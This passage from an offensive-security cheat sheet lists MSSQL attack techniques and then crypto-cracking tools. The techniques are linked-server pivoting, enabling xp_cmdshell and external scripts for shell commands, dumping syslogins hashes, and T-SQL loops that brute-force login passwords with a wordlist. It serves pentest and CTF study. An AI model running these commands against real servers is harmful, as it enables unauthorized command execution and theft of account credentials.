<span class="c1">-- All info</span>
<span class="k">EXEC</span> <span class="n">sp_linkedservers</span></code></pre></div></div></li> </ul> <h4 id="sql--t-sql--mssql---linked-servers--execute-queries"> <a href="#sql--t-sql--mssql---linked-servers--execute-queries" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---linked-servers--execute-queries"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Execute Queries </h4> <ul> <li>From <a href="https://dba.stackexchange.com/a/115204">here</a>:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- Use external double quotes and</span>
<span class="c1">-- internal single quotes if needed</span>
<span class="k">EXEC</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">-</span><span class="n">linked</span><span class="o">-</span><span class="n">server</span><span class="o">&gt;</span><span class="p">.[</span><span class="n">master</span><span class="p">].</span><span class="n">sys</span><span class="p">.</span><span class="n">sp_executesql</span> <span class="n">N</span><span class="s1">'SELECT @@VERSION;'</span>
<span class="c1">-- N'&lt;query&gt;' doesn't limit length</span>

<span class="c1">-- Or</span>
<span class="k">EXEC</span><span class="p">(</span><span class="s1">'SELECT SYSTEM_USER;'</span><span class="p">)</span> <span class="k">AT</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">-</span><span class="n">linked</span><span class="o">-</span><span class="n">server</span><span class="o">&gt;</span>

 <span class="c1">-- Use double quotes in the name</span>
 <span class="c1">-- if it contains backslashes</span></code></pre></div></div></li> <li>Check whether the access from the linked server to the current one has higher privileges (<a href="https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links">Trusted Link</a>):<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">EXEC</span> <span class="nv">"&lt;linked-srv&gt;"</span><span class="p">.[</span><span class="n">master</span><span class="p">].</span><span class="n">sys</span><span class="p">.</span><span class="n">sp_executesql</span> <span class="n">N</span><span class="s1">'EXEC(</span><span class="se">''</span><span class="s1">SELECT SYSTEM_USER;</span><span class="se">''</span><span class="s1">) AT "&lt;current-srv&gt;"'</span></code></pre></div></div></li> </ul> <h3 id="sql--t-sql--mssql---cheatsheets-enumerations"> <a href="#sql--t-sql--mssql---cheatsheets-enumerations" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---cheatsheets-enumerations"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Cheatsheets/Enumerations </h3> <ul> <li>MSF - <code>auxiliary/admin/mssql/mssql_enum</code></li> <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">Pentestmonkey</a></li> <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server">HackTricks</a></li> </ul> <h3 id="sql--t-sql--mssql---execute-system-commands"> <a href="#sql--t-sql--mssql---execute-system-commands" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---execute-system-commands"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Execute System Commands </h3> <ul> <li>From <a href="https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/">here</a>:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- You may need to execute it in a DB</span>
<span class="n">USE</span> <span class="n">master</span>

<span class="c1">-- Check for high privileges</span>
<span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">)</span>

<span class="c1">-- Enable the feature</span>
<span class="k">EXEC</span> <span class="n">sp_configure</span> <span class="s1">'show advanced option'</span><span class="p">,</span> <span class="s1">'1'</span>
<span class="n">RECONFIGURE</span> <span class="k">WITH</span> <span class="n">OVERRIDE</span>

<span class="k">EXEC</span> <span class="n">sp_configure</span> <span class="s1">'xp_cmdshell'</span><span class="p">,</span> <span class="mi">1</span>
<span class="n">RECONFIGURE</span>

<span class="c1">-- Use the feature</span>
<span class="n">xp_cmdshell</span> <span class="s1">'&lt;shell-command&gt;'</span>

<span class="c1">-- You may need to use a SELECT</span>
<span class="k">SELECT</span> <span class="n">xp_cmdshell</span> <span class="s1">'&lt;shell-command&gt;'</span>

<span class="c1">-- OR</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">xp_cmdshell</span> <span class="s1">'&lt;shell-command&gt;'</span></code></pre></div></div></li> </ul> <h3 id="sql--t-sql--mssql---execute-scripts"> <a href="#sql--t-sql--mssql---execute-scripts" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---execute-scripts"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Execute Scripts </h3> <ul> <li>Scripts may be executed in a different user with higher privileges than IIS:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">EXEC</span> <span class="n">sp_configure</span> <span class="s1">'external scripts enabled'</span><span class="p">,</span> <span class="mi">1</span>
<span class="n">RECONFIGURE</span> <span class="k">WITH</span> <span class="n">OVERRIDE</span>

<span class="c1">-- Python and R are supported langs</span>
<span class="n">sp_execute_external_script</span> <span class="o">@</span><span class="k">language</span> <span class="o">=</span><span class="n">N</span><span class="s1">'Python'</span><span class="p">,</span> <span class="o">@</span><span class="n">script</span><span class="o">=</span><span class="n">N</span><span class="s1">'import os;os.system("whoami")'</span>

<span class="c1">-- R variant</span>
<span class="n">sp_execute_external_script</span> <span class="o">@</span><span class="k">language</span> <span class="o">=</span><span class="n">N</span><span class="s1">'R'</span><span class="p">,</span> <span class="o">@</span><span class="n">script</span><span class="o">=</span><span class="n">N</span><span class="s1">'shell("whoami", NULL)'</span></code></pre></div></div></li> </ul> <h3 id="sql--t-sql--mssql---write-text-files-without-xp_cmdshell"> <a href="#sql--t-sql--mssql---write-text-files-without-xp_cmdshell" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---write-text-files-without-xp_cmdshell"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Write Text Files Without xp_cmdshell </h3> <ul> <li>From <a href="https://blog.sqlauthority.com/2019/08/04/how-to-write-in-text-file-from-t-sql-in-sql-server-interview-question-of-the-week-236/">here</a>:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- Step 1: Enable Ole Automation Procedures</span>
<span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span> <span class="mi">1</span>
<span class="n">RECONFIGURE</span>

<span class="n">sp_configure</span> <span class="s1">'Ole Automation Procedures'</span><span class="p">,</span> <span class="mi">1</span>
<span class="n">RECONFIGURE</span>
<span class="c1">-- You may need to use EXEC and OVERRIDE:</span>
<span class="k">EXEC</span> <span class="n">sp_configure</span> <span class="s1">'show advanced option'</span><span class="p">,</span> <span class="s1">'1'</span>
<span class="n">RECONFIGURE</span> <span class="k">WITH</span> <span class="n">OVERRIDE</span>

<span class="c1">-- Step 2: Write Text File</span>
<span class="k">DECLARE</span> <span class="o">@</span><span class="n">OLE</span> <span class="nb">INT</span>
<span class="k">DECLARE</span> <span class="o">@</span><span class="n">FileID</span> <span class="nb">INT</span>
<span class="k">EXECUTE</span> <span class="n">sp_OACreate</span> <span class="s1">'Scripting.FileSystemObject'</span><span class="p">,</span> <span class="o">@</span><span class="n">OLE</span> <span class="k">OUT</span>
<span class="k">EXECUTE</span> <span class="n">sp_OAMethod</span> <span class="o">@</span><span class="n">OLE</span><span class="p">,</span> <span class="s1">'OpenTextFile'</span><span class="p">,</span> <span class="o">@</span><span class="n">FileID</span> <span class="k">OUT</span><span class="p">,</span> <span class="s1">'C:</span><span class="se">\&lt;</span><span class="s1">file-path&gt;.txt'</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span>
<span class="k">EXECUTE</span> <span class="n">sp_OAMethod</span> <span class="o">@</span><span class="n">FileID</span><span class="p">,</span> <span class="s1">'WriteLine'</span><span class="p">,</span> <span class="k">Null</span><span class="p">,</span> <span class="s1">'&lt;string&gt;'</span>
<span class="k">EXECUTE</span> <span class="n">sp_OADestroy</span> <span class="o">@</span><span class="n">FileID</span>
<span class="k">EXECUTE</span> <span class="n">sp_OADestroy</span> <span class="o">@</span><span class="n">OLE</span></code></pre></div></div></li> </ul> <h3 id="sql--t-sql--mssql---create-backup-to-disk"> <a href="#sql--t-sql--mssql---create-backup-to-disk" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---create-backup-to-disk"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Create Backup to disk </h3> <ul> <li>From <a href="https://stackoverflow.com/a/122737">here</a>:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BACKUP</span> <span class="k">DATABASE</span> <span class="o">&lt;</span><span class="k">database</span><span class="o">&gt;</span> <span class="k">TO</span> <span class="n">DISK</span><span class="o">=</span><span class="s1">'C:</span><span class="se">\&lt;</span><span class="s1">path+name&gt;'</span> <span class="k">WITH</span> <span class="n">FORMAT</span></code></pre></div></div></li> <li>Find more examples in <a href="https://docs.microsoft.com/en-us/sql/relational-databases/backup-restore/create-a-full-database-backup-sql-server?view=sql-server-ver15#a-back-up-to-a-disk-device">docs.microsoft</a></li> </ul> <h3 id="sql--t-sql--mssql---list-users"> <a href="#sql--t-sql--mssql---list-users" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---list-users"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> List Users </h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span><span class="p">,</span> <span class="n">password</span> <span class="k">from</span> <span class="n">syslogins</span></code></pre></div></div> <h3 id="sql--t-sql--mssql---bruteforce-passwords"> <a href="#sql--t-sql--mssql---bruteforce-passwords" class="anchor-heading" aria-labelledby="sql--t-sql--mssql---bruteforce-passwords"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bruteforce Passwords </h3> <ul> <li>The rockyou dictionary needs to be trimmed for the attack as the <a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/pwdcompare-transact-sql?view=sql-server-ver15">PWDCOMPARE function has an input length limit</a>: <code>perl -ine &#39;print if not @seen{$_}++ and length $_ &lt; 129&#39; rockyou.txt</code></li> <li>Note that older Windows Server versions are case-insensitive so use <code>tr &#39;[A-Z]&#39; &#39;[a-z]&#39;</code> before the previous perl (or add <code>lc</code> to the <code>seen</code> hash population)</li> <li>The rockyou dictionary fits in its entirety if properly trimmed</li> <li>Note that the ROWTERMINATOR is extremely important to get it right <a href="https://www.mssqltips.com/sqlservertip/4648/sql-server-bulk-insert-row-terminator-issues/">0x0a -&gt; Unix/Windows 0x0d -&gt; Mac</a></li> <li><a href="https://www.sqlshack.com/security-testing-sql-logins-with-the-pwdcompare-function/#urvanov-syntax-highlighter-6076b7c0c6e5f924579045">Modern T-SQL commands for bruteforcing</a></li> </ul><div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- Most efficient (due to short circuit) that works in Windows Server 2000</span>
<span class="c1">--------------------------------------</span>
<span class="c1">-- Note that the crack will take more than one hour</span>
<span class="c1">--------------------------------------</span>
<span class="c1">-- The length of @sName is kept at minimum to prevent long headings</span>
<span class="c1">--------------------------------------</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="o">#</span><span class="n">tmp</span><span class="p">(</span><span class="n">checkPass</span> <span class="n">NVARCHAR</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span>
<span class="n">BULK</span> <span class="k">INSERT</span> <span class="o">#</span><span class="n">tmp</span> <span class="k">FROM</span> <span class="s1">'C:</span><span class="se">\W</span><span class="s1">INNT</span><span class="se">\T</span><span class="s1">emp</span><span class="se">\r</span><span class="s1">ockyou.txt'</span> <span class="k">WITH</span> <span class="p">(</span><span class="n">ROWTERMINATOR</span> <span class="o">=</span> <span class="s1">'0x0a'</span><span class="p">)</span>

<span class="k">DECLARE</span> <span class="n">login_cursor</span> <span class="k">CURSOR</span> <span class="k">FOR</span> <span class="k">SELECT</span> <span class="n">name</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">syslogins</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">createdate</span>
<span class="k">OPEN</span> <span class="n">login_cursor</span>

<span class="k">DECLARE</span> <span class="o">@</span><span class="n">sName</span> <span class="n">NVARCHAR</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="o">@</span><span class="n">sPass</span> <span class="n">NVARCHAR</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
<span class="k">FETCH</span> <span class="k">NEXT</span> <span class="k">FROM</span> <span class="n">login_cursor</span> <span class="k">INTO</span> <span class="o">@</span><span class="n">sName</span><span class="p">,</span> <span class="o">@</span><span class="n">sPass</span>
<span class="n">WHILE</span> <span class="o">@@</span><span class="n">FETCH_STATUS</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">BEGIN</span>
<span class="k">SELECT</span> <span class="o">@</span><span class="n">sName</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">TOP</span> <span class="mi">1</span> <span class="n">checkPass</span> <span class="k">FROM</span> <span class="o">#</span><span class="n">tmp</span> <span class="k">WHERE</span> <span class="n">PWDCOMPARE</span><span class="p">(</span><span class="n">checkPass</span><span class="p">,</span> <span class="o">@</span><span class="n">sPass</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">FETCH</span> <span class="k">NEXT</span> <span class="k">FROM</span> <span class="n">login_cursor</span> <span class="k">INTO</span> <span class="o">@</span><span class="n">sName</span><span class="p">,</span> <span class="o">@</span><span class="n">sPass</span>
<span class="k">END</span>
<span class="k">CLOSE</span> <span class="n">login_cursor</span>
<span class="k">DEALLOCATE</span> <span class="n">login_cursor</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="o">#</span><span class="n">tmp</span>

<span class="c1">--------------------------------------</span>
<span class="c1">-- For at least Windows Server 2006 it may be possible to use the WITH &lt;name&gt; as ( select ... ) select ... &lt;name&gt; or use CROSS APPLY with another query or function (used like the INNER JOIN below but allowing short-circuiting)</span>
<span class="c1">--------------------------------------</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="o">#</span><span class="n">tmp</span><span class="p">(</span><span class="n">checkPass</span> <span class="n">NVARCHAR</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span>
<span class="n">BULK</span> <span class="k">INSERT</span> <span class="o">#</span><span class="n">tmp</span> <span class="k">FROM</span> <span class="s1">'C:</span><span class="se">\W</span><span class="s1">INNT</span><span class="se">\T</span><span class="s1">emp</span><span class="se">\r</span><span class="s1">ockyou.txt'</span> <span class="k">WITH</span> <span class="p">(</span><span class="n">ROWTERMINATOR</span> <span class="o">=</span> <span class="s1">'0x0a'</span><span class="p">)</span>

<span class="k">CREATE</span> <span class="k">FUNCTION</span> <span class="n">passCheck</span><span class="p">(</span><span class="o">@</span><span class="n">pass</span> <span class="nb">VARBINARY</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span>
<span class="k">RETURNS</span> <span class="k">TABLE</span> <span class="k">AS</span> <span class="k">RETURN</span> <span class="p">(</span> <span class="k">SELECT</span> <span class="n">TOP</span> <span class="mi">1</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">#</span><span class="n">tmp</span> <span class="k">WHERE</span> <span class="n">PWDCOMPARE</span><span class="p">(</span><span class="n">checkPass</span><span class="p">,</span> <span class="o">@</span><span class="n">pass</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">)</span>
<span class="k">SELECT</span> <span class="n">s</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">t</span><span class="p">.</span><span class="n">checkPass</span> <span class="k">FROM</span> <span class="n">syslogins</span> <span class="n">s</span> <span class="k">CROSS</span> <span class="n">APPLY</span> <span class="n">passCheck</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">password</span><span class="p">)</span> <span class="n">t</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="o">#</span><span class="n">tmp</span>

<span class="c1">--------------------------------------</span>
<span class="c1">-- Not short circuit but without loop works in Windows Server 2000</span>
<span class="c1">--------------------------------------</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="o">#</span><span class="n">tmp</span><span class="p">(</span><span class="n">CheckValue</span> <span class="n">NVARCHAR</span><span class="p">(</span><span class="mi">1000</span><span class="p">))</span>

<span class="n">BULK</span> <span class="k">INSERT</span> <span class="o">#</span><span class="n">tmp</span> <span class="k">FROM</span> <span class="s1">'C:</span><span class="se">\r</span><span class="s1">ockyou.txt'</span> <span class="k">WITH</span> <span class="p">(</span><span class="n">ROWTERMINATOR</span> <span class="o">=</span> <span class="s1">'0x0a'</span><span class="p">)</span>

<span class="k">SELECT</span> <span class="n">s</span><span class="p">.</span><span class="n">name</span> <span class="k">AS</span> <span class="n">name</span><span class="p">,</span> <span class="n">t</span><span class="p">.</span><span class="n">CheckValue</span> <span class="k">AS</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">syslogins</span> <span class="n">s</span> <span class="k">INNER</span> <span class="k">JOIN</span> <span class="o">#</span><span class="n">tmp</span> <span class="n">t</span> <span class="k">ON</span> <span class="n">PWDCOMPARE</span><span class="p">(</span><span class="n">t</span><span class="p">.</span><span class="n">CheckValue</span><span class="p">,</span> <span class="n">s</span><span class="p">.</span><span class="n">password</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>

<span class="c1">--------------------------------------</span>
<span class="c1">-- This one iterates over the dictionary instead of the syslogins (less efficient)</span>
<span class="c1">--------------------------------------</span>
<span class="c1">-- Pipe osql -E -Q "&lt;inline-query&gt;" | findstr /v /C:"^ ----" /C:"(1 row affected)" /C:"^ name" /C:"^$"</span>
<span class="c1">-- Or use the -o &lt;output&gt; flag</span>
<span class="c1">--------------------------------------</span>
<span class="k">declare</span> <span class="n">file_cursor</span> <span class="k">CURSOR</span> <span class="k">FOR</span> <span class="k">SELECT</span> <span class="n">CheckValue</span> <span class="k">FROM</span> <span class="o">#</span><span class="n">tmp</span>
<span class="k">OPEN</span> <span class="n">file_cursor</span>
<span class="k">DECLARE</span> <span class="o">@</span><span class="n">passCmp</span> <span class="n">sysname</span>
<span class="k">FETCH</span> <span class="k">NEXT</span> <span class="k">FROM</span> <span class="n">file_cursor</span> <span class="k">INTO</span> <span class="o">@</span><span class="n">passCmp</span>
<span class="n">WHILE</span> <span class="o">@@</span><span class="n">FETCH_STATUS</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">BEGIN</span>
<span class="k">SELECT</span> <span class="n">NAME</span> <span class="k">FROM</span> <span class="n">syslogins</span> <span class="k">WHERE</span> <span class="n">PWDCOMPARE</span><span class="p">(</span><span class="o">@</span><span class="n">passCmp</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">@</span><span class="n">passCmp</span>
<span class="k">FETCH</span> <span class="k">NEXT</span> <span class="k">FROM</span> <span class="n">file_cursor</span> <span class="k">INTO</span> <span class="o">@</span><span class="n">passCmp</span>
<span class="k">END</span>
<span class="k">CLOSE</span> <span class="n">file_cursor</span>
<span class="k">DEALLOCATE</span> <span class="n">file_cursor</span>

<span class="c1">--------------------------------------</span>
<span class="c1">-- Unefficient while loop</span>
<span class="c1">--------------------------------------</span>
<span class="n">WHILE</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="o">#</span><span class="n">tmp</span> <span class="k">WHERE</span> <span class="n">line</span> <span class="k">IS</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
<span class="k">BEGIN</span>
<span class="k">SELECT</span> <span class="n">TOP</span> <span class="mi">1</span> <span class="o">@</span><span class="n">passCmp</span> <span class="o">=</span> <span class="n">line</span> <span class="k">FROM</span> <span class="o">#</span><span class="n">tmp</span>
<span class="k">SELECT</span> <span class="n">NAME</span> <span class="k">FROM</span> <span class="n">syslogins</span> <span class="k">WHERE</span> <span class="n">PWDCOMPARE</span><span class="p">(</span><span class="o">@</span><span class="n">passCmp</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">UNION</span> <span class="k">ALL</span> <span class="k">SELECT</span> <span class="o">@</span><span class="n">passCmp</span>
<span class="k">DELETE</span> <span class="k">FROM</span> <span class="o">#</span><span class="n">tmp</span> <span class="k">WHERE</span> <span class="n">line</span> <span class="o">=</span> <span class="o">@</span><span class="n">passCmp</span>
<span class="k">END</span></code></pre></div></div> <h2 id="sql--soql---salesforce-sql"> <a href="#sql--soql---salesforce-sql" class="anchor-heading" aria-labelledby="sql--soql---salesforce-sql"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SOQL - Salesforce SQL </h2> <ul> <li>Limited SQL without: <ul> <li>UNION</li> <li>Wildcards</li> <li>String concat</li> <li>Almost all functions except COUNT()</li> </ul> </li> <li>Strings are single quotes only</li> <li>Usage of AND followed by OR require parentheses: <code>... OR (...)</code></li> <li>Left member of comparison must be a column from the table being queried</li> <li>Inner/Outer tables must differ from main one</li> <li>Outer join limited to ID only:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Name</span> <span class="k">FROM</span> <span class="k">table</span> <span class="k">WHERE</span> <span class="n">Id</span> <span class="k">IN</span> <span class="p">(</span><span class="k">SELECT</span> <span class="n">Id</span> <span class="k">FROM</span> <span class="n">other_table</span> <span class="p">...)</span></code></pre></div></div></li> <li>No apparent limitation for Inner join:<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Id</span><span class="p">,</span> <span class="p">(</span><span class="k">SELECT</span> <span class="n">Name</span> <span class="k">FROM</span> <span class="n">other_table</span><span class="p">)</span> <span class="k">FROM</span> <span class="k">table</span></code></pre></div></div></li> </ul> <h1 id="encryption"> <a href="#encryption" class="anchor-heading" aria-labelledby="encryption"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Encryption </h1> <h2 id="encryption--notes"> <a href="#encryption--notes" class="anchor-heading" aria-labelledby="encryption--notes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Notes </h2> <ul> <li>Key-based alphabetic ciphers may reveal the key through <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">KPA</a> using known-whitespace-trimmed-text as key</li> </ul> <h2 id="encryption--websites"> <a href="#encryption--websites" class="anchor-heading" aria-labelledby="encryption--websites"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Websites </h2> <h3 id="encryption--websites--boxentriq"> <a href="#encryption--websites--boxentriq" class="anchor-heading" aria-labelledby="encryption--websites--boxentriq"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Boxentriq </h3> <ul> <li><a href="https://www.boxentriq.com/code-breaking/cipher-identifier">Site</a> - Identify and crack ciphers</li> </ul> <h3 id="encryption--websites--cyberchef"> <a href="#encryption--websites--cyberchef" class="anchor-heading" aria-labelledby="encryption--websites--cyberchef"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CyberChef </h3> <ul> <li><a href="https://gchq.github.io/CyberChef/">Site</a> (<a href="https://github.com/gchq/CyberChef">github</a>) - Multi-crypto site</li> <li>Use <a href="https://github.com/gchq/CyberChef/wiki/Automatic-detection-of-encoded-data-using-CyberChef-Magic">Magic</a> mode to detect encodings</li> </ul> <h3 id="encryption--websites--scwf"> <a href="#encryption--websites--scwf" class="anchor-heading" aria-labelledby="encryption--websites--scwf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SCWF </h3> <ul> <li><a href="https://scwf.dima.ninja/">Site</a> - Auto-crack cryptos (chaotic)</li> </ul> <h3 id="encryption--websites--crypto-site---one-time-pad"> <a href="#encryption--websites--crypto-site---one-time-pad" class="anchor-heading" aria-labelledby="encryption--websites--crypto-site---one-time-pad"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Crypto Site - One Time Pad </h3> <ul> <li><a href="http://rumkin.com/tools/cipher/otp.php">Site</a> - Multiple crypto tools</li> </ul> <h3 id="encryption--websites--quipqiup"> <a href="#encryption--websites--quipqiup" class="anchor-heading" aria-labelledby="encryption--websites--quipqiup"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> quipqiup </h3> <ul> <li><a href="https://quipqiup.com">Site</a> - Automated crypto/cipher solver</li> </ul> <h2 id="encryption--tools"> <a href="#encryption--tools" class="anchor-heading" aria-labelledby="encryption--tools"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tools </h2> <h3 id="encryption--tools--ciphey"> <a href="#encryption--tools--ciphey" class="anchor-heading" aria-labelledby="encryption--tools--ciphey"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Ciphey </h3> <ul> <li><a href="https://github.com/Ciphey/Ciphey">Site</a> - AI auto-cracker<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ciphey <span class="nt">-t</span> <span class="s2">"&lt;hash/encrypt&gt;"</span>
<span class="c"># -w &lt;wlist&gt; - Words found in -t</span>
<span class="c"># -q - Quiet - Don't show progress</span></code></pre></div></div></li> </ul> <h3 id="encryption--tools--rsactftool"> <a href="#encryption--tools--rsactftool" class="anchor-heading" aria-labelledby="encryption--tools--rsactftool"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> RsaCtfTool </h3> <ul> <li><a href="https://github.com/Ganapati/RsaCtfTool">Site</a> - Crack RSA/recover private key:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Obtain private RSA from .pub</span>
RsaCtfTool.py <span class="nt">--publickey</span> &lt;key.pub&gt; <span class="nt">--private</span>
<span class="c"># sagemath and opt-depends required</span>

<span class="c"># Uncipher file</span>
RsaCtfTool.py <span class="nt">--publickey</span> &lt;key.pub&gt; <span class="nt">--uncipherfile</span> &lt;file&gt;

<span class="c"># Convert to PEM format</span>
RsaCtfTool.py <span class="nt">--publickey</span> &lt;key.pub&gt; <span class="nt">--convert_idrsa_pub</span></code></pre></div></div></li> </ul> <h3 id="encryption--tools--gpg"> <a href="#encryption--tools--gpg" class="anchor-heading" aria-labelledby="encryption--tools--gpg"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> GPG </h3> <ul> <li><a href="https://gnupg.org/">Site</a> - GPG tool - <a href="https://guides.library.illinois.edu/data_encryption/gpgcheatsheet">Cheatsheet</a><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Import keys (public/private)</span>
gpg <span class="nt">--import</span> file.gpg

<span class="c"># Decrypt messages</span>
gpg <span class="nt">--decrypt</span> msg.enc

<span class="c"># List private keys</span>
gpg <span class="nt">--list-secret-keys</span>

<span class="c"># Delete private key</span>
gpg <span class="nt">--delete-secret-keys</span> &lt;key&gt;

<span class="c"># Delete public key</span>
gpg <span class="nt">--delete-key</span> &lt;key&gt;</code></pre></div></div></li> </ul> <h3 id="encryption--tools--decodify"> <a href="#encryption--tools--decodify" class="anchor-heading" aria-labelledby="encryption--tools--decodify"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Decodify </h3> <ul> <li><a href="https://github.com/s0md3v/Decodify">Site</a> - Find hashes on the net + ROT:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dcode <span class="s2">"&lt;hash&gt;"</span>

<span class="c"># All ROT (lowercase output)</span>
dcode <span class="nt">-rot</span> all <span class="s2">"&lt;hash&gt;"</span></code></pre></div></div></li> </ul> <h3 id="encryption--tools--subbreaker"> <a href="#encryption--tools--subbreaker" class="anchor-heading" aria-labelledby="encryption--tools--subbreaker"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Subbreaker </h3> <ul> <li><a href="https://gitlab.com/guballa/SubstitutionBreaker">Site</a> - En/decode/break classic crypto:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>subbreaker <span class="nb">break</span> <span class="nt">--text</span> <span class="s2">"&lt;text&gt;"</span>
<span class="c"># --lang EN by default</span></code></pre></div></div></li> </ul> <h3 id="encryption--tools--rot"> <a href="#encryption--tools--rot" class="anchor-heading" aria-labelledby="encryption--tools--rot"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ROT </h3> <ul> <li><a href="https://github.com/lucyoa/ctf-tools/blob/master/crypto/rot.py">Site</a> - Perform ROT en/decoding:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># All 25 ROT</span>
